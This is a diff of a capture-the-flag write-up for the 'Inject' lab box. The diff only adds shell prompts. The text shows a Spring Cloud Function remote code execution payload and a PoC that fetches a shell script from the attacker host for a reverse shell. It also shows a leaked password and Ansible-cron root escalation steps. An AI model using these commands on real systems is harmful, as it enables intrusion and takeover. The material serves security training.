@@ -20,8 +20,8 @@ Inject is an easy Linux box at `10.10.11.204`. Two ports were open: `22` running
 I started with a full port sweep, then a service scan on what came back.
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.204
-nmap -p 22,8080 -sCV 10.10.11.204
+$ nmap -p- --min-rate 10000 10.10.11.204
+$ nmap -p 22,8080 -sCV 10.10.11.204
 ```
 
 The interesting result:
@@ -99,7 +99,7 @@ spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec
 First I proved execution with a ping I could watch on a `tcpdump`:
 
 ```bash
-curl -X POST http://10.10.11.204:8080/functionRouter \
+$ curl -X POST http://10.10.11.204:8080/functionRouter \
   -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 10.10.16.19")' \
   -d 'a'
 ```
@@ -153,7 +153,7 @@ if __name__ == "__main__":
 Each call to `execCommand` is a single program invocation, so `wget` and `bash` each run cleanly with their own argv. With a `nc -lvnp 1337` waiting, I ran it:
 
 ```bash
-python3 poc.py 10.10.16.19 1337
+$ python3 poc.py 10.10.16.19 1337
 ```
 
 The box fetched `/tmp/.shell.sh`, ran it, and the listener caught a shell as `frank`, the app user. If you would rather avoid the staging file, the same execution works with bash brace expansion to dodge the space splitting, for example `bash -c {echo,BASE64}|{base64,-d}|bash`, since `{a,b}` expands to separate argv elements without literal spaces.
@@ -163,7 +163,7 @@ The box fetched `/tmp/.shell.sh`, ran it, and the listener caught a shell as `fr
 `frank` did not own the user flag. Looking around his home, the Maven config leaked a password:
 
 ```bash
-cat /home/frank/.m2/settings.xml
+$ cat /home/frank/.m2/settings.xml
 ```
 
 ```xml
@@ -186,7 +186,7 @@ cat /home/frank/.m2/settings.xml
 SSH as phil was blocked. `sshd_config` carried a `DenyUsers phil` line, so the key and password were useless over 22. But the rule only governs SSH, not local switching, so from frank's shell:
 
 ```bash
-su - phil
+$ su - phil
 # password: DocPhillovestoInject123
 ```
 
@@ -197,9 +197,9 @@ That worked, and phil owned `user.txt`.
 I dropped `pspy64` on the box to watch for scheduled jobs running as other users:
 
 ```bash
-wget http://10.10.16.19/pspy64 -O /tmp/pspy64
-chmod +x /tmp/pspy64
-/tmp/pspy64
+$ wget http://10.10.16.19/pspy64 -O /tmp/pspy64
+$ chmod +x /tmp/pspy64
+$ /tmp/pspy64
 ```
 
 On a short interval, root ran an Ansible playbook:
@@ -211,9 +211,9 @@ UID=0 PID=1485 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/task
 The driver behind it is a cron calling `ansible-parallel /opt/automation/tasks/*.yml`, so root runs every `.yml` file it finds in that directory. The directory permissions are the bug:
 
 ```bash
-ls -ld /opt/automation/tasks
+$ ls -ld /opt/automation/tasks
 # drwxrwxr-x 2 root staff ... /opt/automation/tasks
-id
+$ id
 # ... groups=...,50(staff)
 ```
 
@@ -231,16 +231,16 @@ EOF
 The shorthand inline form also works:
 
 ```bash
-echo "[{hosts: localhost, tasks: [shell: /bin/bash /tmp/.shell.sh]}]" > /opt/automation/tasks/playbook_2.yml
+$ echo "[{hosts: localhost, tasks: [shell: /bin/bash /tmp/.shell.sh]}]" > /opt/automation/tasks/playbook_2.yml
 ```
 
 When `ansible-parallel` picked the file up, the task ran as root and dropped a SUID bash. Running it kept the root euid:
 
 ```bash
-/tmp/.bash -p
-id
+$ /tmp/.bash -p
+$ id
 # uid=1001(phil) ... euid=0(root)
-cat /root/root.txt
+$ cat /root/root.txt
 ```
 
 ## takeaway
